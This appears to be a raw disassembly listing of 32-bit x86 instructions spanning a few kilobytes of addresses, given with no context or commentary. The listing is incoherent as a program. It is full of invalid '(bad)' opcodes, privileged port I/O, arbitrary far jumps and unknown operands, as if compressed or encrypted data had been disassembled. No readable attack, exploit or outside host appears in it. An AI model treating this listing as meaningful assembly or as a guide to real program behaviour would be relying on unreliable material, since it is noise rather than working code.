  425d98:	fbstp  TBYTE PTR ds:0x58cc4a7f
  425d9e:	cdq    
  425d9f:	stc    
  425da0:	addr16 mov ebp,0x1b0841e4
  425da6:	loop   0x425e1c
  425da8:	test   eax,0xb24daccf
  425dad:	jmp    0x6fd1:0xb8d7363b
  425db4:	cli    
  425db5:	aaa    
  425db6:	jle    0x425ddc
  425db8:	rol    DWORD PTR [esi+0x78],cl
  425dbb:	pushf  
  425dbc:	fdiv   st,st(6)
  425dbe:	addr16 jne 0x425e33
  425dc1:	inc    esi
  425dc2:	xchg   ebp,eax
  425dc3:	cmp    DWORD PTR [eax+edi*4-0x64],ebx
  425dc7:	gs pop ebx
  425dc9:	mov    ch,0x13
  425dcb:	cmp    BYTE PTR [ebp+0xf],0xed
  425dcf:	daa    
  425dd0:	jns    0x425e16
  425dd2:	xor    al,0x6c
  425dd4:	(bad)  
  425dd6:	push   es
  425dd7:	mov    edi,0x953c9b4d
  425ddc:	adc    dh,ah
  425dde:	lea    ebx,[ebp-0x7a]
  425de1:	push   ds
  425de2:	in     al,0xfa
  425de4:	and    DWORD PTR ds:0x9a0479b2,esi
  425dea:	cmp    eax,0x9ecde929
  425def:	test   eax,0x886bddac
  425df4:	pushf  
  425df5:	and    al,ah
  425df7:	cwde   
  425df8:	jecxz  0x425e56
  425dfa:	xchg   esp,eax
  425dfb:	in     al,0x54
  425dfd:	jne    0x425e63
  425dff:	mov    ah,0xd
  425e01:	sub    esi,eax
  425e03:	mov    cl,0x9e
  425e05:	mov    edi,0xda89113c
  425e0a:	mov    dl,0x23
  425e0c:	imul   ebx,edx,0x1b
  425e0f:	rcl    DWORD PTR [eax-0x5b832f40],0x98
  425e16:	inc    ecx
  425e17:	xchg   edx,eax
  425e18:	adc    al,0x31
  425e1a:	sti    
  425e1b:	pop    edx
  425e1c:	sbb    al,0x5a
  425e1e:	xchg   ecx,eax
  425e1f:	mov    WORD PTR [ecx],fs
  425e21:	stos   DWORD PTR es:[edi],eax
  425e22:	xor    ebx,DWORD PTR [ecx-0x1fe892e1]
  425e28:	jae    0x425e28
  425e2a:	sbb    edx,0xf
  425e2d:	add    BYTE PTR [eax-0x41],0x6
  425e31:	mov    al,0x24
  425e33:	rol    esp,1
  425e35:	rol    BYTE PTR [edx+0xe],cl
  425e38:	inc    edi
  425e39:	popf   
  425e3a:	and    DWORD PTR [eax+0x7392e23e],esi
  425e40:	push   0x3d26effe
  425e45:	pop    edi
  425e46:	push   eax
  425e47:	sub    al,BYTE PTR [eax]
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xb7
  425e57:	sbb    al,0xa1
  425e59:	dec    ecx
  425e5a:	ss in  al,dx
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	xchg   BYTE PTR [esi],al
  425e60:	add    BYTE PTR [eax],al
  425e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e63:	rcr    esp,1
  425e65:	cmp    dl,BYTE PTR [edi]
  425e67:	ja     0x425ec8
  425e69:	mov    al,ds:0xe80927ec
  425e6e:	xor    eax,0xd693f47a
  425e74:	and    ebp,DWORD PTR [edx-0x7405a577]
  425e7a:	xor    bl,0x88
  425e7d:	push   0x0
  425e7f:	cwde   
  425e80:	dec    ebp
  425e81:	cs sub ch,dl
  425e84:	mov    edi,0x387d5dc
  425e89:	neg    DWORD PTR ds:0x9ee25105
  425e8f:	inc    esp
  425e90:	popf   
  425e91:	jp     0x425ea3
  425e93:	mov    ebx,0xc3730f5b
  425e98:	push   ss
  425e99:	shl    BYTE PTR [edx+0x33],cl
  425e9c:	push   ebp
  425e9d:	sbb    bh,cl
  425e9f:	xchg   ah,bh
  425ea1:	sub    al,0x10
  425ea3:	imul   ebp,DWORD PTR [ecx],0xffffff9a
  425ea6:	dec    eax
  425ea7:	inc    esi
  425ea8:	xor    al,0x26
  425eaa:	clc    
  425eab:	jo     0x425ed8
  425ead:	xchg   ecx,eax
  425eae:	dec    esp
  425eaf:	jge    0x425ef3
  425eb1:	mov    edx,0x3731fc15
  425eb6:	mov    dl,0xc8
  425eb8:	sbb    cl,BYTE PTR [ecx*1-0x39d53bc3]
  425ebf:	popf   
  425ec0:	add    ah,BYTE PTR [edx]
  425ec2:	gs push ebx
  425ec4:	sub    eax,DWORD PTR [edx]
  425ec6:	mov    esp,0x43bdc5db
  425ecb:	imul   BYTE PTR [ebx]
  425ecd:	int    0xfc
  425ecf:	cmp    BYTE PTR [edx],bl
  425ed1:	xchg   DWORD PTR [eax],ebp
  425ed3:	cmp    al,0x34
  425ed5:	mov    esi,0x78e41ffa
  425eda:	push   ds
  425edb:	inc    ah
  425edd:	rol    DWORD PTR [ebp+0x730e4a56],1
  425ee3:	(bad)  [edi+0x288b70ed]
  425ee9:	push   cs
  425eea:	out    dx,eax
  425eeb:	mov    ch,0x2c
  425eed:	or     eax,0x650b676d
  425ef2:	adc    al,0xed
  425ef4:	rcr    BYTE PTR [edi],0x19
  425ef7:	cmp    dl,bh
  425ef9:	push   es
  425efa:	add    eax,0xc2778767
  425eff:	sahf   
  425f00:	mov    dl,0x49
  425f02:	pop    ebp
  425f03:	rep lods eax,DWORD PTR ds:[esi]
  425f05:	inc    edi
  425f06:	rcl    ah,0x4a
  425f09:	jns    0x425f80
  425f0b:	div    BYTE PTR [eax+0x61099635]
  425f11:	div    DWORD PTR [edx]
  425f13:	jp     0x425f25
  425f15:	cld    
  425f16:	add    eax,0x3da1189b
  425f1b:	pop    edx
  425f1c:	jne    0x425ea4
  425f1e:	jg     0x425f54
  425f20:	pop    ecx
  425f21:	mov    ebx,0x93e552a5
  425f26:	or     ebx,DWORD PTR [edi]
  425f28:	xlat   BYTE PTR ds:[ebx]
  425f29:	mov    edx,0x8ed67122
  425f2e:	gs repnz out dx,al
  425f31:	fcmovnbe st,st(7)
  425f33:	xchg   esp,eax
  425f34:	inc    esi
  425f35:	cmp    edx,DWORD PTR [edx-0x377223b1]
  425f3b:	int    0x96
  425f3d:	stos   BYTE PTR es:[edi],al
  425f3e:	add    al,0xb3
  425f40:	xchg   ecx,eax
  425f41:	mov    BYTE PTR [ecx+0x64],dh
  425f44:	adc    ch,BYTE PTR [esi+0x23733014]
  425f4a:	out    0x78,al
  425f4c:	cmovne esp,DWORD PTR [edx+0x2e7934aa]
  425f53:	mov    ah,0xa6
  425f55:	repz pop edx
  425f57:	out    dx,eax
  425f58:	shl    DWORD PTR [edi-0x21537a36],1
  425f5e:	popf   
  425f5f:	jge    0x425f66
  425f61:	loop   0x425fc6
  425f63:	push   ss
  425f64:	dec    ecx
  425f65:	ins    DWORD PTR es:[edi],dx
  425f66:	cmp    DWORD PTR [eax],ecx
  425f68:	cmp    eax,0xb2988564
  425f6d:	sub    al,0x27
  425f6f:	pusha  
  425f70:	sar    BYTE PTR [ebx+0xa494b32],cl
  425f76:	push   cs
  425f77:	iret   
  425f78:	pop    esp
  425f79:	stc    
  425f7a:	retf   0xc0cc
  425f7d:	xor    DWORD PTR [ebx-0x31],ebx
  425f80:	mov    bl,0x5e
  425f82:	in     eax,0xf
  425f84:	or     ebx,DWORD PTR [edi]
  425f86:	(bad)  
  425f87:	(bad)  
  425f88:	jp     0x425fb7
  425f8a:	inc    ecx
  425f8b:	add    BYTE PTR [ebp+0x57],bl
  425f8e:	xor    DWORD PTR [ebx-0x2d38b0c8],ebp
  425f94:	jg     0x425f7a
  425f96:	dec    esp
  425f97:	and    dh,bh
  425f99:	xchg   DWORD PTR [esi],esp
  425f9b:	mov    edi,0x5db73249
  425fa0:	pop    edx
  425fa1:	add    ah,BYTE PTR [edx+0x31858d31]
  425fa7:	xchg   esi,eax
  425fa8:	mov    cl,0xa4
  425faa:	test   DWORD PTR [edx],ebp
  425fac:	mov    BYTE PTR [ebp+0x4aedbf9],bl
  425fb2:	add    esi,DWORD PTR [ebp-0x7f]
  425fb5:	fdiv   DWORD PTR [ebp+0xd844515]
  425fbb:	adc    DWORD PTR [eax+0x7f5aa7bc],0x2d6449cd
  425fc5:	(bad)  [eax+ebp*1]
  425fc8:	test   al,0xa1
  425fca:	rcr    ch,1
  425fcc:	pop    es
  425fcd:	in     al,0x19
  425fcf:	push   eax
  425fd0:	mov    dl,0x9b
  425fd2:	cdq    
  425fd3:	rcl    DWORD PTR [ebx],1
  425fd5:	enter  0x8a54,0x57
  425fd9:	dec    esi
  425fda:	xor    bl,dh
  425fdc:	jns    0x425f63
  425fde:	push   ecx
  425fdf:	daa    
  425fe0:	pop    ebp
  425fe1:	adc    BYTE PTR [ebx+edx*8+0x5],al
  425fe5:	mov    ?,WORD PTR [edi]
  425fe7:	sbb    ecx,edx
  425fe9:	mov    bh,0xa9
  425feb:	jno    0x426024
  425fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fee:	jb     0x425fdd
  425ff0:	rcr    WORD PTR [ecx-0x6e92ab23],cl
  425ff7:	popa   
  425ff8:	mov    bh,0xc4
  425ffa:	ds retf 0x3e5
  425ffe:	rol    BYTE PTR [ebx+0x3c],0xeb
  426002:	ds ins BYTE PTR es:[edi],dx
  426004:	push   0xa542a8d5
  426009:	stc    
  42600a:	in     eax,dx
  42600b:	stc    
  42600c:	pop    es
  42600d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42600e:	mov    bh,0x95
  426010:	pushf  
  426011:	or     al,0x19
  426013:	jle    0x426035
  426015:	cmp    eax,eax
  426017:	paddsw mm3,mm1
  42601a:	jmp    0xcd50:0x6ec690b9
  426021:	lods   al,BYTE PTR ds:[esi]
  426022:	cmp    eax,0x376b165e
  426027:	outs   dx,BYTE PTR ds:[esi]
  426028:	ja     0x426054
  42602a:	fnsave [ebp-0x4c]
  42602d:	in     al,dx
  42602e:	arpl   WORD PTR [edx],si
  426030:	aam    0x54
  426032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426033:	sbb    bl,bl
  426035:	ret    
  426036:	int3   
  426037:	call   0xe783d842
  42603c:	cmp    eax,0x9c51d2f5
  426041:	and    DWORD PTR [esi],ebx
  426043:	and    al,0x35
  426045:	jmp    0x426091
  426047:	pop    ebp
  426048:	ins    BYTE PTR es:[edi],dx
  426049:	adc    DWORD PTR [eax-0x7f],edi
  42604c:	ins    DWORD PTR es:[edi],dx
  42604d:	sahf   
  42604e:	and    DWORD PTR [ecx],esi
  426050:	test   BYTE PTR [ebx-0x20],cl
  426053:	mov    ebp,0x9d237824
  426058:	jl     0x426098
  42605a:	popa   
  42605b:	int    0x8e
  42605d:	sub    eax,DWORD PTR [esi+0xec68ec0]
  426063:	xchg   edx,eax
  426064:	je     0x426033
  426066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426067:	xlat   BYTE PTR ds:[ebx]
  426068:	sub    DWORD PTR [edx+0x1303f78d],edx
  42606e:	mov    ch,0xe4
  426070:	lea    ebx,[esi+0x28]
  426073:	pusha  
  426074:	mov    dh,0xb8
  426076:	stos   BYTE PTR es:[edi],al
  426077:	je     0x42602b
  426079:	mov    bl,0x20
  42607b:	rcr    BYTE PTR ds:0x18a969c9,1
  426081:	test   eax,0x14ea69ad
  426086:	sahf   
  426087:	(bad)  
  426088:	aaa    
  426089:	out    0x65,eax
  42608b:	pop    edx
  42608c:	push   ebp
  42608d:	dec    esi
  42608e:	popf   
  42608f:	int3   
  426090:	mov    bh,0x52
  426092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426093:	adc    DWORD PTR [edx-0x2f],eax
  426096:	loopne 0x42610b
  426098:	mov    ebx,0x89de96ff
  42609d:	neg    DWORD PTR [ebx]
  42609f:	test   BYTE PTR [edi],cl
  4260a1:	loopne 0x42606e
  4260a3:	xchg   esi,eax
  4260a4:	ret    
  4260a5:	mov    ebp,0x2113bffc
  4260aa:	push   esi
  4260ab:	push   eax
  4260ac:	cmp    BYTE PTR [edi+edi*2-0x7943a443],ah
  4260b3:	jmp    0x426089
  4260b5:	mov    edx,0x2834143e
  4260ba:	dec    ebx
  4260bb:	cmp    ch,BYTE PTR [esi+0x54]
  4260be:	loope  0x4260ee
  4260c0:	sub    ebp,DWORD PTR [eax+eax*4]
  4260c3:	jo     0x426137
  4260c5:	das    
  4260c6:	cmp    dh,dh
  4260c8:	sahf   
  4260c9:	lods   eax,DWORD PTR ds:[esi]
  4260ca:	or     edi,DWORD PTR [edi+0x2a]
  4260cd:	call   0xba869585
  4260d2:	repnz fcom st(5)
  4260d5:	push   es
  4260d6:	fs push edx
  4260d8:	jecxz  0x42614f
  4260da:	cld    
  4260db:	mov    DWORD PTR [esi],ebx
  4260dd:	jge    0x426075
  4260df:	lahf   
  4260e0:	and    esi,DWORD PTR [edx]
  4260e2:	pop    ds
  4260e3:	clc    
  4260e4:	dec    ecx
  4260e5:	fidivr DWORD PTR [eax-0x5eaa64ae]
  4260eb:	neg    dh
  4260ed:	sar    dh,cl
  4260ef:	ins    DWORD PTR es:[edi],dx
  4260f0:	icebp  
  4260f1:	es push eax
  4260f3:	es push cs
  4260f5:	call   0x3903:0x3b1a0da4
  4260fc:	outs   dx,DWORD PTR ds:[esi]
  4260fd:	mov    eax,eax
  4260ff:	sbb    eax,ecx
  426101:	loope  0x4260f5
  426103:	stos   DWORD PTR es:[edi],eax
  426104:	icebp  
  426105:	jmp    0x9c21709a
  42610a:	xchg   esi,eax
  42610b:	rcl    DWORD PTR [eax+0x46],cl
  42610e:	test   DWORD PTR [esi-0x1a],0x6d7646f0
  426115:	scas   eax,DWORD PTR es:[edi]
  426116:	sahf   
  426117:	jnp    0x4260db
  426119:	xchg   esp,eax
  42611a:	mov    edx,esp
  42611c:	cs push eax
  42611e:	ds inc esi
  426120:	shr    DWORD PTR [edx-0x4e],1
  426123:	sbb    BYTE PTR [ebp-0x7c],cl
  426126:	pop    edi
  426127:	mov    eax,0x824950e2
  42612c:	mov    edi,0x95b50942
  426131:	dec    ebx
  426132:	mov    ebp,0x1ea0e2a5
  426137:	cmp    BYTE PTR [eax+edi*1],0x8f
  42613b:	xchg   ebp,eax
  42613c:	xchg   esp,eax
  42613d:	add    DWORD PTR [eax+0x23d51c51],ebp
  426143:	inc    ecx
  426144:	inc    esp
  426145:	mov    ds:0x1c7351c0,al
  42614a:	ret    
  42614b:	sub    DWORD PTR [eax+0x24fdcc04],edi
  426151:	scas   al,BYTE PTR es:[edi]
  426152:	jno    0x426115
  426154:	popf   
  426155:	loope  0x4260f2
  426157:	fldcw  WORD PTR [edx-0x1c541f65]
  42615d:	cmc    
  42615e:	lock and dh,BYTE PTR [ebp-0x33]
  426162:	pop    ss
  426163:	ret    0xb904
  426166:	jl     0x4261d7
  426168:	xchg   esi,eax
  426169:	sbb    ecx,DWORD PTR ds:0xa416b726
  42616f:	sbb    al,BYTE PTR [edi]
  426171:	sbb    eax,0x27b8068c
  426176:	push   esp
  426177:	inc    esi
  426178:	jp     0x42611f
  42617a:	jb     0x4261cd
  42617c:	(bad)  
  42617e:	fwait
  42617f:	xchg   esp,eax
  426180:	repz aaa 
  426182:	xchg   bx,ax
  426184:	jle    0x4261c8
  426186:	popa   
  426187:	inc    ecx
  426188:	lock jae 0x42615d
  42618b:	(bad)  
  42618c:	jmp    0xfe98:0xfe7b03bb
  426193:	scas   al,BYTE PTR es:[edi]
  426194:	es gs add esi,ecx
  426198:	mov    ebp,0x5adfe22a
  42619d:	jb     0x426155
  42619f:	push   es
  4261a0:	sbb    DWORD PTR [ecx-0xb],0xffffffde
  4261a4:	adc    eax,0x45dbc89c
  4261a9:	inc    esi
  4261aa:	ret    0x2924
  4261ad:	xchg   edi,eax
  4261ae:	add    bh,BYTE PTR [esi+0xaa0b058]
  4261b4:	adc    DWORD PTR [edi+0x19],ebp
  4261b7:	fstp   TBYTE PTR [esi+0x7a709e92]
  4261bd:	call   0x9352:0x4d0c50f3
  4261c4:	test   DWORD PTR [edi-0x3e],edx
  4261c7:	or     BYTE PTR [edi+0x2caaee10],bh
  4261cd:	mov    esp,0x1996071b
  4261d2:	jb     0x42619e
  4261d4:	pop    edi
  4261d5:	jno    0x42615a
  4261d7:	cdq    
  4261d8:	pop    esi
  4261d9:	and    al,0x75
  4261db:	adc    ch,BYTE PTR [ecx-0x70]
  4261de:	out    0x42,eax
  4261e0:	xchg   ebx,eax
  4261e1:	dec    ecx
  4261e2:	ja     0x4261be
  4261e4:	ds or  eax,edx
  4261e7:	xchg   esi,eax
  4261e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261e9:	shl    DWORD PTR [eax-0x6f],1
  4261ec:	addr16 push ss
  4261ee:	lea    esi,[ecx-0x6]
  4261f1:	es idiv esp
  4261f4:	xchg   BYTE PTR [edx],dh
  4261f6:	pop    esp
  4261f7:	ret    
  4261f8:	ret    0x9af9
  4261fb:	retf   0xfea0
  4261fe:	xor    BYTE PTR [ebx-0x45b2bd17],0xe3
  426205:	cmp    eax,0xb49e2310
  42620a:	or     esi,DWORD PTR [eax-0x33]
  42620d:	lods   eax,DWORD PTR ds:[esi]
  42620e:	inc    esp
  42620f:	dec    BYTE PTR [edi-0x16]
  426212:	jbe    0x4261b0
  426214:	adc    eax,0x68b1a0e3
  426219:	neg    DWORD PTR ds:0x51b79960
  42621f:	adc    ebx,0x63
  426222:	fmulp  st(5),st
  426224:	test   eax,0xfd6d3518
  426229:	xchg   ecx,eax
  42622a:	jmp    0xabbed7dc
  42622f:	jnp    0x426238
  426231:	push   ecx
  426232:	sbb    al,BYTE PTR [ebx+0x68a2b967]
  426238:	repz pop esp
  42623a:	xor    edx,DWORD PTR [edx-0x6d]
  42623d:	push   ecx
  42623e:	scas   al,BYTE PTR es:[edi]
  42623f:	aam    0x73
  426241:	outs   dx,DWORD PTR ds:[esi]
  426242:	push   0x6cb62165
  426247:	dec    esi
  426248:	sub    al,0x92
  42624a:	call   0x2ee9:0x9d6e655c
  426251:	add    BYTE PTR [ebp+0x7f659990],ah
  426257:	pusha  
  426258:	jae    0x426268
  42625a:	mov    ch,0x6a
  42625c:	fsubr  QWORD PTR [eax+0x3ff81638]
  426262:	jne    0x4262ca
  426264:	sub    al,0x35
  426266:	fs jo  0x42622d
  426269:	inc    ebx
  42626a:	fmul   st,st(5)
  42626c:	inc    eax
  42626d:	xor    al,0xe6
  42626f:	stos   BYTE PTR es:[edi],al
  426270:	adc    edi,DWORD PTR [esi]
  426272:	sub    eax,0xb3d70ab0
  426277:	or     dh,cl
  426279:	fadd   st,st(4)
  42627b:	aam    0xb6
  42627d:	mov    bh,0x48
  42627f:	(bad)  
  426280:	das    
  426281:	cmp    edi,DWORD PTR [esi-0x4205beba]
  426287:	sbb    BYTE PTR [ecx-0x26b5cddb],bl
  42628d:	mov    BYTE PTR [edi-0x5c],bh
  426290:	jo     0x4262e2
  426292:	dec    esi
  426293:	test   al,0x93
  426295:	sbb    BYTE PTR [esi-0x5d],bl
  426298:	mov    dl,0x49
  42629a:	push   edi
  42629b:	mov    al,0x3c
  42629d:	out    0x20,eax
  42629f:	addr16 dec esi
  4262a1:	mov    al,ds:0xee188ec2
  4262a6:	ja     0x42624f
  4262a8:	or     al,0xf7
  4262aa:	inc    ebx
  4262ab:	dec    esi
  4262ac:	ret    
  4262ad:	jne    0x4262e4
  4262af:	cld    
  4262b0:	bound  edi,QWORD PTR [edi+0x5f]
  4262b3:	ror    DWORD PTR [edi+0xe],cl
  4262b6:	adc    eax,0x6e7488d8
  4262bb:	lahf   
  4262bc:	jg     0x42632f
  4262be:	jmp    0x4262f1
  4262c0:	xchg   esi,eax
  4262c1:	pop    ecx
  4262c2:	xor    al,0x47
  4262c4:	(bad)
  4262c8:	enter  0x8a77,0xc6
  4262cc:	mov    eax,ds:0xe5226bfe
  4262d1:	mov    edi,0x54a71198
  4262d6:	adc    al,0x5a
  4262d8:	ror    esp,1
  4262da:	jge    0x42630d
  4262dc:	push   edi
  4262dd:	mov    edi,0x152c75ae
  4262e2:	daa    
  4262e3:	leave  
  4262e4:	push   ebx
  4262e5:	popf   
  4262e6:	fwait
  4262e7:	int3   
  4262e8:	jno    0x426366
  4262ea:	je     0x426366
  4262ec:	dec    ebp
  4262ed:	push   edx
  4262ee:	aas    
  4262ef:	int    0x48
  4262f1:	pop    edi
  4262f2:	jmp    0x6bd2:0xb6862caf
  4262f9:	inc    edi
  4262fa:	fbstp  TBYTE PTR [ecx-0x6d]
  4262fd:	xchg   esp,eax
  4262fe:	arpl   WORD PTR [eax+ecx*8],sp
  426301:	fidivr WORD PTR [ebx*2+0x559ba0cb]
  426308:	js     0x426365
  42630a:	inc    edi
  42630b:	sbb    al,0xd7
  42630d:	lahf   
  42630e:	lods   al,BYTE PTR ds:[esi]
  42630f:	or     ah,0xee
  426312:	nop
  426313:	mov    cl,0x51
  426315:	nop
  426316:	mov    bl,0x3e
  426318:	sbb    DWORD PTR [esi],ebp
  42631a:	xlat   BYTE PTR ds:[ebx]
  42631b:	(bad)  
  42631c:	dec    ebx
  42631d:	lods   al,BYTE PTR ds:[esi]
  42631e:	sbb    ah,BYTE PTR [edx+esi*8]
  426321:	pusha  
  426322:	loope  0x42636b
  426324:	jl     0x42635f
  426326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426327:	sub    DWORD PTR [eax],0x6a
  42632a:	popf   
  42632b:	cmp    DWORD PTR [edx+ecx*8-0x18476677],eax
  426332:	or     al,0xb5
  426334:	aam    0x84
  426336:	out    0x10,al
  426338:	out    0x59,al
  42633a:	xchg   esi,eax
  42633b:	jne    0x4262be
  42633d:	pop    ss
  42633e:	inc    ebp
  42633f:	lds    ebx,FWORD PTR [edx-0x29aef70d]
  426345:	leave  
  426346:	sbb    BYTE PTR [esp+edi*8],bl
  426349:	mov    ds:0x59dc475d,eax
  42634e:	fwait
  42634f:	adc    BYTE PTR ds:0x7906a2e7,ch
  426355:	sub    DWORD PTR gs:[eax+0x23],ebp
  426359:	ret    0x9ac9
  42635c:	neg    ebp
  42635e:	jecxz  0x426333
  426360:	jo     0x426355
  426362:	pop    edi
  426363:	sub    bl,bh
  426365:	in     al,0xf0
  426367:	xor    al,0xe
  426369:	sub    BYTE PTR [eax-0x706bc654],bh
  42636f:	xor    BYTE PTR [eax+0x23],ah
  426372:	mov    BYTE PTR [ebx-0x46108f1f],0xd8
  426379:	repnz push 0x5a
  42637c:	(bad)  
  42637d:	(bad)  
  42637e:	jmp    0x3842:0x9a77881a
  426385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426386:	outs   dx,BYTE PTR ds:[esi]
  426387:	sub    cl,BYTE PTR [ecx+0x7e]
  42638a:	retf   
  42638b:	cmp    DWORD PTR [ebp+0x70],ebx
  42638e:	mov    ebx,0x33d43b90
  426393:	iret   
  426394:	jmp    0xbd559e96
  426399:	sar    bl,0x13
  42639c:	or     BYTE PTR [edi-0x7c89e408],al
  4263a2:	add    dl,0x79
  4263a5:	retf   
  4263a6:	sbb    DWORD PTR [edx],ebx
  4263a8:	packuswb mm5,mm3
  4263ab:	repnz addr16 sti 
  4263ae:	call   0x1e3a:0x16e478f9
  4263b5:	inc    eax
  4263b6:	sbb    ah,0x3
  4263b9:	cmc    
  4263ba:	jmp    0x42640a
  4263bc:	xor    eax,0x3c8c111a
  4263c1:	push   es
  4263c2:	pop    esi
  4263c3:	add    dh,cl
  4263c5:	lods   al,BYTE PTR ds:[esi]
  4263c6:	pop    esp
  4263c7:	xor    eax,0x4a64b1d8
  4263cc:	xor    DWORD PTR [edx+0x60],edi
  4263cf:	xchg   ecx,eax
  4263d0:	aas    
  4263d1:	sub    DWORD PTR ds:0xa37a76a9,esi
  4263d7:	test   BYTE PTR [edi+esi*2],bl
  4263da:	ret    
  4263db:	push   ss
  4263dc:	lods   al,BYTE PTR ds:[esi]
  4263dd:	rcl    WORD PTR [edx],0x16
  4263e1:	aaa    
  4263e2:	or     BYTE PTR [esi],ch
  4263e4:	mov    ss,WORD PTR [eax-0x22bf1651]
  4263ea:	jg     0x4263c4
  4263ec:	outs   dx,BYTE PTR ds:[esi]
  4263ed:	add    DWORD PTR [edx-0x489495ea],edi
  4263f3:	imul   BYTE PTR [ecx-0x4f]
  4263f6:	fs jns 0x426427
  4263f9:	inc    edx
  4263fa:	(bad)  
  4263fb:	out    dx,eax
  4263fc:	mov    WORD PTR [ecx+0x5b132a9e],ds
  426402:	in     eax,0xc5
  426404:	cld    
  426405:	adc    bl,BYTE PTR [ebx+edx*4-0x3c]
  426409:	cmp    dl,BYTE PTR ds:0x7470e16a
  42640f:	add    BYTE PTR [eax+0x22329a74],ah
  426415:	xchg   edx,eax
  426416:	push   es
  426417:	outs   dx,BYTE PTR cs:[esi]
  426419:	test   al,0x23
  42641b:	jl     0x426435
  42641d:	sbb    BYTE PTR [ebx+0x7ee10584],dh
  426423:	push   eax
  426424:	mov    ebx,0x97aef992
  426429:	neg    DWORD PTR [esi]
  42642b:	xor    BYTE PTR [edx],ch
  42642d:	xor    BYTE PTR [ebx],dl
  42642f:	mov    edx,0x752da517
  426435:	push   cs
  426436:	jae    0x426424
  426438:	dec    ebp
  426439:	stc    
  42643a:	mov    DWORD PTR [edi-0x7d],0x8e7f18ff
  426441:	push   ebx
  426442:	mov    BYTE PTR [esi+0x17],ah
  426445:	in     eax,0x0
  426447:	sub    eax,0x2ddab8ed
  42644c:	xor    BYTE PTR [edx],dl
  42644e:	mov    edx,0x9920e5ae
  426453:	shr    DWORD PTR [ebp+0x1a000426],0xd
  42645a:	inc    esp
  42645b:	stc    
  42645c:	sbb    eax,0x6888dd81
  426461:	cmp    al,ch
  426463:	push   esp
  426464:	ins    BYTE PTR es:[edi],dx
  426465:	sub    al,0x90
  426467:	cmp    bl,BYTE PTR [ebx]
  426469:	repnz sub DWORD PTR [edi-0x12],esi
  42646d:	adc    ah,dl
  42646f:	rol    DWORD PTR [ecx],0xeb
  426472:	aam    0x53
  426474:	les    ecx,FWORD PTR [eax-0x1f]
  426477:	mov    BYTE PTR [ebp-0x3bd16af4],bl
  42647d:	(bad)  
  42647e:	rcl    BYTE PTR [ecx],cl
  426480:	inc    ecx
  426481:	inc    esp
  426482:	vpcmpeqd xmm5,xmm6,XMMWORD PTR [edx-0x58ed303f]
  42648a:	fcmovb st,st(5)
  42648c:	clc    
  42648d:	sub    eax,0xcf3e7fa2
  426492:	push   0x703edb89
  426497:	fnstsw WORD PTR [eax]
  426499:	pop    esp
  42649a:	outs   dx,DWORD PTR ds:[esi]
  42649b:	jbe    0x426429
  42649d:	mov    ds:0xeec7ce6f,al
  4264a2:	icebp  
  4264a3:	mov    ebp,0x3e142965
  4264a8:	(bad)  
  4264a9:	dec    BYTE PTR [ecx+0x61c8523f]
  4264af:	aad    0x3f
  4264b1:	xor    ebx,ebp
  4264b3:	sbb    BYTE PTR [ecx+0x51],dl
  4264b6:	test   al,0x79
  4264b8:	pop    ebp
  4264b9:	inc    eax
  4264ba:	add    eax,0x2b90289f
  4264bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264c0:	(bad)  
  4264c1:	mov    esp,0x77a52a9a
  4264c6:	lock xor BYTE PTR [ecx],ch
  4264c9:	and    ebp,DWORD PTR [edx-0x232823f5]
  4264cf:	jl     0x4264f1
  4264d1:	sti    
  4264d2:	sahf   
  4264d3:	sbb    DWORD PTR [ecx-0x362838af],edx
  4264d9:	sar    BYTE PTR [eax+edx*2+0x5a],1
  4264dd:	mov    bh,0xe9
  4264df:	ja     0x426472
  4264e1:	fucomip st,st(6)
  4264e3:	(bad)  
  4264e4:	call   0x5681f7
  4264e9:	add    BYTE PTR [ecx+0x55],cl
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	pop    eax
  4264f7:	sub    edx,esi
  4264f9:	ds mov esp,0x860001f2
  4264ff:	push   es
  426500:	add    BYTE PTR [eax],al
  426502:	ds cld 
  426504:	xchg   edi,eax
  426505:	cld    
  426506:	dec    esi
  426507:	ins    BYTE PTR es:[edi],dx
  426508:	in     al,0x4b
  42650a:	retf   0x3368
  42650d:	dec    eax
  42650e:	bound  eax,QWORD PTR [ecx+0x3d]
  426511:	push   ebp
  426512:	out    0xee,al
  426514:	sbb    DWORD PTR [edi-0x5c],ebp
  426517:	not    DWORD PTR [ebp+0x3d8c53c4]
  42651d:	dec    ebx
  42651e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42651f:	test   ebp,0xbac2d959
  426525:	sub    eax,0xcb07a104
  42652a:	xchg   esp,eax
  42652b:	mov    esp,0x6c163958
  426530:	jno    0x426599
  426532:	int3   
  426533:	out    dx,al
  426534:	sti    
  426535:	or     esi,DWORD PTR [edi+0x76]
  426538:	push   0x6
  42653a:	or     eax,0x63de2d31
  42653f:	add    DWORD PTR ds:0xc94632ab,ebx
  426545:	dec    ecx
  426546:	pop    eax
  426547:	or     ch,ch
  426549:	sub    esi,esi
  42654b:	cmp    BYTE PTR [edx],bl
  42654d:	lock mov dh,0x94
  426550:	aaa    
  426551:	repz pop ds
  426553:	inc    esi
  426554:	sub    dl,BYTE PTR [edx-0x4737b02b]
  42655a:	mov    ?,WORD PTR [edx-0x58a57155]
  426560:	clc    
  426561:	sub    al,0x83
  426563:	and    ecx,edi
  426565:	dec    ebp
  426566:	jmp    0x673a0f6e
  42656b:	or     ebp,DWORD PTR [eax]
  42656d:	std    
  42656e:	mov    al,0xc0
